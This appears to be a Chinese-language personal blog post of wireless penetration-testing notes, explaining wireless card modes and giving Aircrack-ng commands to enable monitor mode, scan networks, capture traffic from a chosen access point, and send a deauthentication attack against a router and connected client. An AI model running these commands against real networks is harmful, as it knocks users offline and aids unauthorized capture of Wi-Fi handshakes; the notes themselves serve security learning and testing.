---
title: "无线渗透笔记"
date: 2019-07-14 23:51:41
urlname: wireless-pentest-note
categories: 信息安全
tags:
  - Wireless
  - Kali Linux
  - Pentest
---

{% noteblock quote cyan %}

使用 Aircrack-ng 套件进行无线攻击测试。

{% endnoteblock %}

<!-- more -->

## 无线监听

### 技术原理

#### 无线网卡的四种工作模式

- Managed：用于设备与 AP 直接连接， **无线网卡的驱动程序依赖无线 AP 管理整个通信过程。**

- Ad hoc：当你的网络由**互相直连的设备组成**时，就使用这个模式。在这个模式中，无线通信双方共同承担 WAP 的职责。

- Master：主模式，允许无线网卡使用特制的驱动程序和软件工作，作为其他设备的 WAP。

- Monitor：监听模式，停止收发数据，监听无线数据包。

### 执行步骤

#### 切换为监听模式

- 启动 Airmon-ng：

  ```shell
  iwconfig
  airmon-ng start wlx70f11c280f23	# airmon-ng start wlan0
  ```

- 关闭 Network Manager：

  ```shell
  service network-manager stop
  ```

- 开启 Network Manager：

  ```shell
  service network-manager restart
  ```

#### 开启监听

- 使用 Airodump-ng：

  ```shell
  airodump-ng wlan0mon
  ```

#### 捕获数据

- Wireshark：选择监听网卡捕获数据

- Airodump-ng：

  ```shell
  airodump-ng -c 1 wlan0mon -w data	# -c 信道 -w 输出目录名
  ```

## WiFi Crack

### 开启监听

```shell
airmon-ng start wlan0
```

### 扫描信号

```shell
airodump-ng wlan0mon
```

### 选定 Wi-Fi 监听

```shell
airodump-ng wlan0mon -c 11 --bssid BC:46:99:3D:66:D6 -w doc # -w 指定生成的文件名 -c 指定信道 --bssid 指定路由器的 MAC 地址
```

### 攻击

```shell
aireplay-ng -0 50 -a E2:A5:3E:6B:F7:21 -c 44:C3:46:40:7E:5D   wlan0mon # -0 指定发包的数量 -a 指定路由器的MAC地址  -c 指定连接的客户端的 MAC 地址
```
